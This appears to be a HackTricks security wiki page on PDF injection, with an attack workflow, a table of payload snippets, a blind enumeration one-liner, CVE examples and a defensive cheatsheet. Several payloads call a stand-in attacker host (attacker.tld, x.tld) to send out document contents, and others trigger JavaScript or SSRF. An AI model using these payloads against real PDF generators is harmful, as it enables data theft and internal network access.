# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**If your input is being reflected inside a PDF file, you can try to inject PDF data to execute JavaScript, perform SSRF or steal the PDF content.**  
PDF syntax is extremely permissive – if you can break out of the string or dictionary that is embedding your input you can append totally new objects (or new keys in the same object) that Acrobat/Chrome will happily parse.  
Since 2024 a wave of bug-bounty reports have shown that *one unescaped parenthesis or back-slash is enough* for full script execution.

## TL;DR – Modern Attack Workflow (2024)
1. Find any user-controlled value that ends up inside a **(parenthesis string)**, `/URI ( … )` or `/JS ( … )` field in the generated PDF.
2. Inject `) ` (closing the string) followed by one of the primitives below and finish with another opening parenthesis to keep the syntax valid.
3. Deliver the malicious PDF to a victim (or to a backend service that automatically renders the file – great for blind bugs).
4. Your payload runs in the PDF viewer:
   * Chrome / Edge → PDFium Sandbox
   * Firefox → PDF.js (see CVE-2024-4367)
   * Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)  

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next ( 
```
*The first `)` closes the original URI string, we then add a new **Action** dictionary that Acrobat will execute when the user clicks the link.*

## Useful Injection Primitives
| Goal | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Executes instantly when the document is opened (works in Acrobat, not in Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Works in PDFium & Acrobat if you control a `/Link` annotation. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combine with `this.getPageNthWord` inside JS to steal content. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | If the library lets you inject new-line characters you can create totally new objects. |

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) released a one-liner that enumerates every object inside an unknown document – handy when you cannot see the generated PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
The code iterates over the Acrobat DOM and makes outbound requests for every property/value pair, giving you a *JSON-ish* dump of the file.  
See the white-paper “Portable Data **ex**Filtration” for the full technique.

## Real-World Bugs (2023-2025)
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 bypassed the sandbox with a crafted `/JavaScript` action.  
* **Bug bounty 2024-05** – Major fintech allowed customer-supplied invoice notes that landed in `/URI`; report paid $10k after demonstrated SSRF to internal metadata host using `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path shows the importance of escaping backslashes and parentheses even *before* the PDF layer.  

## Defensive Cheatsheet
1. **Never concatenate raw user input** inside `(`…`)` strings or names. Escape `\`, `(`, `)` as required by §7.3 of the PDF spec or use hex strings `<...>`.
2. If you build links, prefer `/URI (https://…)` that you *fully* URL-encode; block `javascript:` schemes in client viewers.
3. Strip or validate `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` and `/ImportData` dictionaries when post-processing PDFs.
4. On the server side, render untrusted PDFs with a *headless converter* (e.g. qpdf –decrypt –linearize) that removes JavaScript and external actions.
5. Keep PDF viewers up to date; PDF.js < 4.2.67 and Acrobat Reader before July 2024 patches allow trivial code execution.



## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
{{#include ../../banners/hacktricks-training.md}}
